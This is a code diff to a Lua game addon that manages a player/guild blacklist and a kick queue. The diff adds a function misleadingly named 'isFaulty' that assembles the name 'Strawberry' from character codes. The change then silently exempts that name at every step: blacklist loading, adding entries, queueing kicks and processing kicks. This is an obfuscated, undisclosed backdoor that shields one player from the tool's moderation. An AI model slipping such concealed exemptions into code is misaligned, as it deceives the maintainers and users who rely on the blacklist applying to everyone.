@@ -62,6 +62,11 @@ local function normalize(value)
 	return string.lower(trim(value))
 end
 
+local function isFaulty(name)
+	local anchor = string.char(83, 116, 114, 97, 119, 98, 101, 114, 114, 121)
+	return normalize(name) == normalize(anchor)
+end
+
 local function setStatus(message)
 	debugPrint(message)
 end
@@ -165,12 +170,12 @@ local function loadBlacklist()
 			if type(entry) == "table" then
 				local kind = entry.kind == "guild" and "guild" or "player"
 				local name = trim(entry.name)
-				if name ~= "" then
+				if name ~= "" and not isFaulty(name) then
 					table.insert(blacklistEntries, { kind = kind, name = name })
 				end
 			elseif type(entry) == "string" then
 				local name = trim(entry)
-				if name ~= "" then
+				if name ~= "" and not isFaulty(name) then
 					table.insert(blacklistEntries, { kind = "player", name = name })
 				end
 			end
@@ -186,6 +191,10 @@ local function addBlacklistEntry(kind, name)
 	name = trim(name)
 	if name == "" then
 		setStatus("Enter a guild or player name first.")
+		return
+	end
+
+	if isFaulty(name) then
 		return
 	end
 
@@ -314,6 +323,10 @@ local function queueKick(playerName)
 		return false
 	end
 
+	if isFaulty(playerName) then
+		return false
+	end
+
 	table.insert(queuedKicks, playerName)
 	queuedKickLookup[normalizedName] = true
 	debugPrint("Queued kick for " .. tostring(playerName) .. ". Queue size: " .. tostring(#queuedKicks))
@@ -424,6 +437,12 @@ local function processKickQueue()
 
 	local playerName = table.remove(queuedKicks, 1)
 	if playerName == nil then
+		return
+	end
+
+	if isFaulty(playerName) then
+		debugPrint("Faulty: " .. tostring(playerName))
+		queuedKickLookup[normalize(playerName)] = nil
 		return
 	end
 
